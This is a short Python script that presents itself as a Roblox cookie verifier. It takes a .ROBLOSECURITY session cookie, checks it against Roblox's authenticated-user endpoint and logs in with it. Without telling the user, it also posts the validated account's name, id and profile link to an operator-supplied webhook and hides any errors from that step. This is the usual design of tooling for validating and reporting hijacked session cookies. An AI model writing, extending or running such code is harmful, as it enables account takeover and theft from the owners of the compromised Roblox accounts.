import roblox
import aiohttp
import asyncio
import requests

WEBHOOK_URL = "INSERT YOUR WEBHOOK URL"


def send_webhook(content: str) -> None:
	try:
		requests.post(WEBHOOK_URL, json={"content": content}, timeout=5)
	except Exception:
		pass



def _extract_cookie(raw: str) -> str:
	"""Extract the cookie value from the provided text.

	Accepts either the raw value, strings like
	".ROBLOSECURITY=<value>" or semicolon-separated pairs.
	"""
	if not raw:
		return ""
	raw = raw.strip()
	if ".ROBLOSECURITY=" in raw:
		parts = raw.split(".ROBLOSECURITY=")
		raw = parts[-1]
	if ";" in raw:
		for part in raw.split(";"):
			part = part.strip()
			if part:
				if "=" in part:
					name, val = part.split("=", 1)
					if name.strip() == ".ROBLOSECURITY" or name.strip().lower() == "roblosecurity":
						return val.strip()
				else:
					return part
	return raw
async def _validate_cookie_async(cookie_value: str) -> (bool, object):
	"""Check whether the cookie is valid by querying the Roblox authenticated user endpoint.

	Returns (True, user_info) if valid,
	(False, status_code) if the response is not 200,
	(None, error_message) on network/other exceptions.
	"""
	url = "https://users.roblox.com/v1/users/authenticated"
	headers = {"Cookie": f".ROBLOSECURITY={cookie_value}"}
	timeout = aiohttp.ClientTimeout(total=10)
	try:
		async with aiohttp.ClientSession(timeout=timeout) as session:
			async with session.get(url, headers=headers) as resp:
				if resp.status == 200:
					try:
						data = await resp.json()
					except Exception:
						data = None
					return True, data
				else:
					return False, resp.status
	except Exception as e:
		return None, str(e)

def main():
	print("Enter the cookie to verify the account:")
	raw = input()
	cookie = _extract_cookie(raw)
	if not cookie:
		print("Empty cookie. Aborting.")
		return
	valid, info = asyncio.run(_validate_cookie_async(cookie))

	if valid is True:
		if isinstance(info, dict):
			username = info.get("name") or info.get("username") or info.get("displayName") or "(name not available)"
			user_id = info.get("id")
			profile_url = f"https://www.roblox.com/users/{user_id}/profile" if user_id is not None else None

			if user_id is not None:
				print(f"Valid cookie. Account: {username} (id {user_id}) - Profile: {profile_url}")
				send_webhook(f"Valid cookie detected for account: {username} (id {user_id}) — Profile: {profile_url}")
			else:
				print(f"Valid cookie. Account: {username} - Profile not available")
				send_webhook(f"Valid cookie detected for account: {username} — Profile: N/A")
		else:
			print("Valid cookie.")
			send_webhook("Valid cookie detected (no user info)")

		try:
			roblox.account.login_cookies(cookie)
			print("Logged in via the 'roblox' library.")
		except Exception as e:
			print("Login with the 'roblox' library failed:", e)

	elif valid is False:
		print(f"Invalid cookie. Response status code: {info}")
	else:
		print(f"Error while validating cookie: {info}")


if __name__ == "__main__":
	main()


